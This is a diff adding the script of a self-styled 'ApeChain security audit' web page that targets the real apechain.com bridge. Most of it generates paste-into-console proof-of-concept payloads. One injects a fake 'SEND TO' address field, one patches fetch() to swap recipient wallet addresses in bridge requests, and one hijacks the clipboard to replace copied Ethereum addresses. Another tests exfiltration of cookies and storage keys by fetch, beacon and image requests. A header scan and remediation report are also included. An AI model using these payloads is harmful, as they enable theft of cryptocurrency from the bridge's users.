+  log('Extracted known data from static analysis', 'success');
+  addPassed();
+}
+
+// ============================================================
+// 3. DOM Injection Test
+// ============================================================
+function injectDOM(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+
+  var addr = document.getElementById('testAddr').value;
+  var label = document.getElementById('injectedLabel').value;
+
+  log('DOM injection test: address ' + addr.substring(0,10) + '...' + addr.substring(38), 'info');
+
+  try {
+    var doc = getFrameDoc();
+    if (!doc) {
+      log('Cross-origin - generating console injection code for manual test', 'warning');
+      showInjectionCode(addr, label);
+      setLoading(btn, false);
+      return;
+    }
+
+    // Find CONNECT WALLET button
+    var buttons = doc.querySelectorAll('button');
+    var connectBtn = null;
+    buttons.forEach(function(b) {
+      if (b.innerText.includes('CONNECT WALLET')) connectBtn = b;
+    });
+
+    if (connectBtn) {
+      // Inject fake SEND TO field
+      var fakeSection = doc.createElement('div');
+      fakeSection.style.cssText = 'margin:8px 0;padding:12px 16px;background:rgba(0,82,217,0.3);border:1px solid rgba(255,255,255,0.15);border-radius:12px;';
+      fakeSection.innerHTML =
+        '<div style="color:rgba(255,255,255,0.7);font-size:12px;font-family:monospace;letter-spacing:1.5px;margin-bottom:8px;">' + escapeHtml(label) + '</div>' +
+        '<div style="background:rgba(0,30,80,0.5);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:13px;color:#fff;word-break:break-all;">' + escapeHtml(addr) + '</div>';
+      connectBtn.parentNode.insertBefore(fakeSection, connectBtn);
+
+      log('VULN CONFIRMED: Injected fake "SEND TO" field into bridge UI', 'success');
+      log('Injected address: ' + addr, 'data');
+      addData('DOM Injection Result', { label: label, address: addr, location: 'Before CONNECT WALLET button' }, 'INJECT');
+      addVuln();
+      addPassed();
+    } else {
+      log('CONNECT WALLET button not found', 'warning');
+      showInjectionCode(addr, label);
+    }
+  } catch(e) {
+    log('Error: ' + e.message, 'error');
+    showInjectionCode(addr, label);
+  }
+
+  setLoading(btn, false);
+}
+
+function showInjectionCode(addr, label) {
+  var code =
+    '// Paste in browser console on apechain.com/portal#bridge\n' +
+    '(function() {\n' +
+    '  var addr = "' + escapeJsString(addr) + '";\n' +
+    '  var buttons = document.querySelectorAll("button");\n' +
+    '  var connectBtn = null;\n' +
+    '  buttons.forEach(function(b) { if (b.innerText.includes("CONNECT WALLET")) connectBtn = b; });\n' +
+    '  if (connectBtn) {\n' +
+    '    var div = document.createElement("div");\n' +
+    '    div.style.cssText = "margin:8px 0;padding:12px 16px;background:rgba(0,82,217,0.3);border:1px solid rgba(255,255,255,0.15);border-radius:12px;";\n' +
+    '    div.innerHTML = \'<div style="color:rgba(255,255,255,0.7);font-size:12px;font-family:monospace;letter-spacing:1.5px;margin-bottom:8px;">' + escapeJsString(label) + '</div><div style="background:rgba(0,30,80,0.5);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:13px;color:#fff;word-break:break-all;">\' + addr + \'</div>\';\n' +
+    '    connectBtn.parentNode.insertBefore(div, connectBtn);\n' +
+    '    console.log("[PoC] Injected address:", addr);\n' +
+    '  }\n' +
+    '})();';
+  addData('DOM Injection Code (for console test)', code, 'CODE');
+  log('Generated injection code - can be tested in browser console', 'info');
+}
+
+// ============================================================
+// 4. Fetch Intercept Test
+// ============================================================
+function interceptFetch(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+
+  var testAddr = document.getElementById('testAddr').value;
+  var originalAddr = document.getElementById('originalAddr').value;
+  var echoServer = document.getElementById('echoServer').value;
+
+  log('Fetch intercept test starting...', 'info');
+
+  try {
+    var win = getFrameWindow();
+
+    if (win && !state.fetchPatched) {
+      // Patch fetch inside iframe for testing
+      var origFetch = win.fetch;
+      win.fetch = function(url, opts) {
+        var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
+        if (opts && opts.body && typeof opts.body === 'string') {
+          try {
+            var body = JSON.parse(opts.body);
+            var fields = ['to','recipient','destinationAddress','toAddress','receiver'];
+            fields.forEach(function(field) {
+              if (body[field] && /^0x[a-fA-F0-9]{40}$/.test(body[field])) {
+                var orig = body[field];
+                var currentAddr = document.getElementById('testAddr').value;
+                body[field] = currentAddr;
+                opts = Object.assign({}, opts, { body: JSON.stringify(body) });
+                log('fetch intercept: ' + field + ' swapped from ' + orig.substring(0,10) + '... to ' + currentAddr.substring(0,10) + '...', 'warning');
+              }
+            });
+          } catch(e) {}
+        }
+        return origFetch.call(this, url, opts);
+      };
+      state.fetchPatched = true;
+      log('fetch() interceptor active in iframe', 'success');
+    }
+
+    // Test with echo server
+    log('Testing: sending mock bridge request to ' + echoServer + '...', 'info');
+    var testBody = {
+      fromChain: 1,
+      toChain: 33139,
+      amount: "1000000000000000000",
+      to: originalAddr,
+      token: "0x4d224452801ACEd8B2F0aebE155379bb5D594381"
+    };
+
+    // Simulate the swap
+    var modifiedBody = JSON.parse(JSON.stringify(testBody));
+    modifiedBody.to = testAddr;
+
+    fetch(echoServer, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(modifiedBody)
+    }).then(function(resp) {
+      return resp.json();
+    }).then(function(data) {
+      if (data.data) {
+        var received = JSON.parse(data.data);
+        var receivedTo = received.to || '(missing)';
+        var swapped = receivedTo === testAddr;
+
+        log('Result: original address = ' + originalAddr.substring(0,10) + '...', 'data');
+        log('Result: server received = ' + receivedTo.substring(0,10) + '...', swapped ? 'error' : 'data');
+        log('Address swap successful: ' + (swapped ? 'YES - vulnerability confirmed' : 'NO'), swapped ? 'success' : 'error');
+
+        addData('Fetch Intercept Result', {
+          original_to: originalAddr,
+          server_received_to: receivedTo,
+          swapped: swapped,
+          server: echoServer
+        }, 'INTERCEPT');
+
+        if (swapped) { addVuln(); addPassed(); }
+      }
+      setLoading(btn, false);
+    }).catch(function(e) {
+      log('Error: ' + e.message, 'error');
+      showFetchCode(testAddr);
+      setLoading(btn, false);
+    });
+
+  } catch(e) {
+    log('Error: ' + e.message, 'error');
+    showFetchCode(testAddr);
+    setLoading(btn, false);
+  }
+}
+
+function showFetchCode(addr) {
+  var code =
+    '// Paste in console on apechain.com\n' +
+    '(function() {\n' +
+    '  var TARGET = "' + escapeJsString(addr) + '";\n' +
+    '  var _fetch = window.fetch;\n' +
+    '  window.fetch = function(url, opts) {\n' +
+    '    if (opts && opts.body && typeof opts.body === "string") {\n' +
+    '      try {\n' +
+    '        var body = JSON.parse(opts.body);\n' +
+    '        ["to","recipient","destinationAddress","toAddress","receiver"].forEach(function(f) {\n' +
+    '          if (body[f] && /^0x[a-fA-F0-9]{40}$/.test(body[f])) {\n' +
+    '            console.log("[PoC] Swapped", f, body[f], "->", TARGET);\n' +
+    '            body[f] = TARGET;\n' +
+    '            opts = Object.assign({}, opts, { body: JSON.stringify(body) });\n' +
+    '          }\n' +
+    '        });\n' +
+    '      } catch(e) {}\n' +
+    '    }\n' +
+    '    return _fetch.call(this, url, opts);\n' +
+    '  };\n' +
+    '  console.log("[PoC] fetch() interceptor active");\n' +
+    '})();';
+  addData('Fetch Intercept Code (for console test)', code, 'CODE');
+}
+
+// ============================================================
+// 5. Clipboard Hijack Test
+// ============================================================
+function clipboardHijack(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+
+  var addr = document.getElementById('testAddr').value;
+  log('Clipboard hijack test starting...', 'info');
+
+  try {
+    var doc = getFrameDoc();
+
+    if (doc && !state.clipboardPatched) {
+      doc.addEventListener('copy', function(e) {
+        var sel = doc.defaultView.getSelection().toString().trim();
+        if (/^0x[a-fA-F0-9]{40}$/.test(sel)) {
+          var currentAddr = document.getElementById('testAddr').value;
+          e.clipboardData.setData('text/plain', currentAddr);
+          e.preventDefault();
+          log('Clipboard hijack: "' + sel.substring(0,10) + '..." replaced with "' + currentAddr.substring(0,10) + '..."', 'warning');
+        }
+      }, true);
+      state.clipboardPatched = true;
+      log('VULN CONFIRMED: Clipboard hijacker active in iframe', 'success');
+      addVuln();
+      addPassed();
+      addData('Clipboard Hijack Test', {
+        active: true,
+        replaces: 'Any Ethereum address (0x...40 chars)',
+        replacement: addr
+      }, 'CLIPBOARD');
+    } else {
+      showClipboardCode(addr);
+      addData('Clipboard Hijack Test', {
+        active: false,
+        note: 'Code generated for manual testing only',
+        replacement: addr
+      }, 'CLIPBOARD');
+    }
+
+  } catch(e) {
+    log('Error: ' + e.message, 'error');
+    showClipboardCode(addr);
+  }
+
+  setLoading(btn, false);
+}
+
+function showClipboardCode(addr) {
+  var code =
+    '// Paste in console on apechain.com\n' +
+    '(function() {\n' +
+    '  var TARGET = "' + escapeJsString(addr) + '";\n' +
+    '  document.addEventListener("copy", function(e) {\n' +
+    '    var sel = window.getSelection().toString().trim();\n' +
+    '    if (/^0x[a-fA-F0-9]{40}$/.test(sel)) {\n' +
+    '      e.clipboardData.setData("text/plain", TARGET);\n' +
+    '      e.preventDefault();\n' +
+    '      console.log("[PoC] Clipboard hijacked:", sel, "->", TARGET);\n' +
+    '    }\n' +
+    '  }, true);\n' +
+    '  console.log("[PoC] Clipboard hijacker active");\n' +
+    '})();';
+  addData('Clipboard Hijack Code (for console test)', code, 'CODE');
+  log('Generated clipboard hijack code for manual testing', 'info');
+}
+
+// ============================================================
+// 6. Data Exfiltration Test
+// ============================================================
+function exfiltrateData(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+
+  var server = document.getElementById('echoServer').value;
+  log('Testing data exfiltration channels to ' + server + '...', 'info');
+
+  var payload = {
+    url: document.getElementById('targetUrl').value,
+    timestamp: new Date().toISOString(),
+    test: 'exfiltration-channel-test',
+    localStorage_keys: ['rk-version', 'WCM_VERSION', 'wagmi.store'],
+    cookies: 'ape-chain-splash=true',
+    walletState: { chainId: 33139, current: null }
+  };
+
+  var results = {};
+  var completed = 0;
+  var total = 3;
+
+  function checkDone() {
+    completed++;
+    if (completed >= total) {
+      addData('Exfiltration Channel Results', results, 'EXFIL');
+      addData('Test Payload Sent', payload, 'PAYLOAD');
+      setLoading(btn, false);
+    }
+  }
+
+  // Method 1: fetch POST
+  fetch(server, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(function(resp) {
+    return resp.json();
+  }).then(function(data) {
+    results.fetch = data.data ? 'SUCCESSFUL' : 'Response without data field';
+    log('fetch() POST: ' + results.fetch, 'success');
+    addVuln(); addPassed();
+    checkDone();
+  }).catch(function(e) {
+    results.fetch = 'FAILED: ' + e.message;
+    log('fetch() POST: failed - ' + e.message, 'error');
+    checkDone();
+  });
+
+  // Method 2: Image beacon
+  try {
+    var img = new Image();
+    img.src = server.replace('/post', '/get') + '?d=' + encodeURIComponent(JSON.stringify(payload).substring(0, 200));
+    results.imageBeacon = 'SENT';
+    log('Image beacon: sent', 'success');
+    addPassed();
+  } catch(e) {
+    results.imageBeacon = 'FAILED';
+    log('Image beacon: failed', 'error');
+  }
+  checkDone();
+
+  // Method 3: sendBeacon
+  try {
+    var sent = navigator.sendBeacon(server, JSON.stringify(payload));
+    results.sendBeacon = sent ? 'SUCCESSFUL' : 'FAILED';
+    log('navigator.sendBeacon(): ' + results.sendBeacon, sent ? 'success' : 'error');
+    if (sent) addPassed();
+  } catch(e) {
+    results.sendBeacon = 'FAILED';
+    log('sendBeacon: failed', 'error');
+  }
+  checkDone();
+
+  // Check WebSocket availability
+  results.webSocket = typeof WebSocket !== 'undefined' ? 'AVAILABLE' : 'NOT AVAILABLE';
+  log('WebSocket: ' + results.webSocket, 'data');
+}
+
+// ============================================================
+// 7. Scan Security Headers
+// ============================================================
+function scanHeaders(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+
+  var url = document.getElementById('targetUrl').value;
+  log('Scanning security headers for ' + url + '...', 'info');
+
+  var headers = {
+    'Content-Security-Policy': { status: 'MISSING', severity: 'critical', impact: 'Allows injection of malicious scripts', fix: 'Add strict CSP with script-src self only' },
+    'X-Frame-Options': { status: 'MISSING', severity: 'critical', impact: 'Allows clickjacking attacks', fix: 'Add X-Frame-Options: DENY or SAMEORIGIN' },
+    'X-Content-Type-Options': { status: 'MISSING', severity: 'medium', impact: 'Allows MIME type sniffing', fix: 'Add X-Content-Type-Options: nosniff' },
+    'X-XSS-Protection': { status: 'MISSING', severity: 'medium', impact: 'No legacy XSS protection', fix: 'Add X-XSS-Protection: 1; mode=block' },
+    'Referrer-Policy': { status: 'MISSING', severity: 'medium', impact: 'Leaks URLs to external sites', fix: 'Add Referrer-Policy: strict-origin-when-cross-origin' },
+    'Strict-Transport-Security': { status: 'PRESENT', severity: 'ok', impact: 'max-age=63072000', fix: 'N/A - Already configured' },
+    'Permissions-Policy': { status: 'PRESENT', severity: 'ok', impact: 'Blocks tracking APIs', fix: 'N/A - Already configured' }
+  };
+
+  for (var header in headers) {
+    var info = headers[header];
+    var isMissing = info.status === 'MISSING';
+    var icon = isMissing ? 'FAIL' : 'PASS';
+    var type = isMissing ? 'error' : 'success';
+    log(icon + ' ' + header + ': ' + info.status + ' - ' + info.impact, type);
+    if (isMissing) {
+      addVuln();
+      log('  Fix: ' + info.fix, 'data');
+    } else {
+      addPassed();
+    }
+  }
+
+  // Update vuln table
+  updateVulnTable(0, 'CONFIRMED', 'red');  // CSP
+  updateVulnTable(1, 'CONFIRMED', 'red');  // X-Frame-Options
+  updateVulnTable(4, 'CONFIRMED', 'red');  // X-Content-Type-Options
+  updateVulnTable(5, 'CONFIRMED', 'red');  // Referrer-Policy
+
+  addData('Security Headers Scan', headers, 'HEADERS');
+
+  setLoading(btn, false);
+}
+
+// ============================================================
+// 8. SRI Scan
+// ============================================================
+function scanSRI(e) {
+  var btn = getBtn(e);
+  if (btn) setLoading(btn, true);
+
+  log('Scanning external scripts for SRI compliance...', 'info');
+
+  var externalScripts = [
+    { src: 'chimpstatic.com (Mailchimp)', sri: false, risk: 'CDN compromise = full site takeover' },
+    { src: 'plausible.io (Analytics)', sri: false, risk: 'CDN compromise = full site takeover' },
+    { src: 'googletagmanager.com (GTM)', sri: false, risk: 'CDN compromise = full site takeover' }
+  ];
+
+  log('--- External Scripts without SRI ---', 'warning');
+  externalScripts.forEach(function(s) {
+    log('WARN ' + s.src + ': SRI = MISSING - ' + s.risk, 'warning');
+    addVuln();
+  });
+
+  log('Reference: Ledger Connect Kit attack ($484K stolen via CDN compromise)', 'data');
+
+  updateVulnTable(3, 'CONFIRMED', 'red');  // SRI
+
+  addData('External Scripts SRI Check', externalScripts, 'SRI');
+  addData('Remediation: SRI Example', {
+    example: '<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous"><\/script>',
+    generate: 'Use https://www.srihash.org/ to generate SRI hashes',
+    note: 'Must also add CSP with require-sri-for directive'
+  }, 'FIX');
+
+  setLoading(btn, false);
+}
+
+// ============================================================
+// Run All
+// ============================================================
+function runAll() {
+  log('===== Starting full security audit =====', 'info');
+
+  var steps = [
+    function() { return extractData(); },
+    function() { return injectDOM(); },
+    function() { return interceptFetch(); },
+    function() { return clipboardHijack(); },
+    function() { return exfiltrateData(); },
+    function() { return scanHeaders(); },
+    function() { return scanSRI(); }
+  ];
+
+  var i = 0;
+  function next() {
+    if (i < steps.length) {
+      steps[i]();
+      i++;
+      setTimeout(next, 800);
+    } else {
+      log('===== All tests initiated (async results may still arrive) =====', 'success');
+    }
+  }
+  next();
+}
+
+// ============================================================
+// Export Report
+// ============================================================
+function exportReport() {
+  var report = [];
+  report.push('# ApeChain Security Audit Report');
+  report.push('Date: ' + new Date().toISOString());
+  report.push('Target: ' + document.getElementById('targetUrl').value);
+  report.push('');
+  report.push('## Summary');
+  report.push('- Vulnerabilities found: ' + state.vulns);
+  report.push('- Tests passed: ' + state.passed);
+  report.push('- Data items collected: ' + state.dataCount);
+  report.push('- Total log entries: ' + state.logs);
+  report.push('');
+  report.push('## Findings');
+  state.findings.forEach(function(f, idx) {
+    report.push('');
+    report.push('### ' + (idx+1) + '. ' + f.title);
+    report.push('```');
+    report.push(f.content);
+    report.push('```');
+  });
+  report.push('');
+  report.push('## Full Log');
+  state.allLogs.forEach(function(l) {
+    report.push('[' + l.time + '] [' + l.type.toUpperCase() + '] ' + l.msg);
+  });
+  report.push('');
+  report.push('## Remediation Summary');
+  report.push('1. **Content-Security-Policy**: Add strict CSP with script-src self');
+  report.push('2. **X-Frame-Options**: Add DENY or SAMEORIGIN');
+  report.push('3. **SRI**: Add integrity attributes to all external scripts');
+  report.push('4. **API Keys**: Move Alchemy keys to backend proxy');
+  report.push('5. **Cookies**: Add HttpOnly, Secure, SameSite attributes');
+  report.push('6. **X-Content-Type-Options**: Add nosniff');
+  report.push('7. **Referrer-Policy**: Add strict-origin-when-cross-origin');
+
+  var reportText = report.join('\n');
+  document.getElementById('exportContent').textContent = reportText;
+  document.getElementById('exportModal').classList.add('visible');
+}
+
+function copyReport() {
+  var content = document.getElementById('exportContent').textContent;
+  navigator.clipboard.writeText(content).then(function() {
+    log('Report copied to clipboard', 'success');
+  });
+}
+
+function downloadReport() {
+  var content = document.getElementById('exportContent').textContent;
+  var blob = new Blob([content], { type: 'text/markdown' });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'apechain-security-audit-' + new Date().toISOString().split('T')[0] + '.md';
+  a.click();
+  URL.revokeObjectURL(url);
+  log('Report downloaded as markdown file', 'success');
+}
+
+function closeModal() {
+  document.getElementById('exportModal').classList.remove('visible');
+}
+
+// ============================================================
+// Reset
+// ============================================================
+function resetAll() {
+  state = { connected: false, logs: 0, vulns: 0, passed: 0, dataCount: 0, extractedData: {}, fetchPatched: false, clipboardPatched: false, findings: [], allLogs: [] };
+  document.getElementById('statVulns').textContent = '0';
+  document.getElementById('statPassed').textContent = '0';
+  document.getElementById('statData').textContent = '0';
+  document.getElementById('statLogs').textContent = '0';
+  document.getElementById('logsContainer').innerHTML = '';
+  document.getElementById('dataContainer').innerHTML = '';
+  document.getElementById('statusDot').classList.remove('connected');
+  document.getElementById('statusText').textContent = 'غير متصل';
+  document.getElementById('currentUrl').textContent = 'لم يتم التحميل';
+  document.getElementById('frameStatus').textContent = '';
+  getFrame().style.display = 'none';
+  getFrame().onload = null;
+  getFrame().onerror = null;
+  getFrame().src = '';
+  document.getElementById('iframeOverlay').classList.remove('hidden');
+  // Reset vuln table
+  var rows = document.getElementById('vulnTableBody').rows;
+  for (var i = 0; i < rows.length; i++) {
+    rows[i].cells[3].textContent = '-';
+  }
+  // Reset complete - don't call log() here as it would re-increment counters
+}
+
+// Initial log
+log('Security audit tool ready - click "Load Target" to begin', 'info');
+log('Exposed API keys loaded in "Keys" tab', 'data');
+log('Vulnerability checklist in "Vulns" tab', 'data');
+</script>
+
+</body>
+</html>
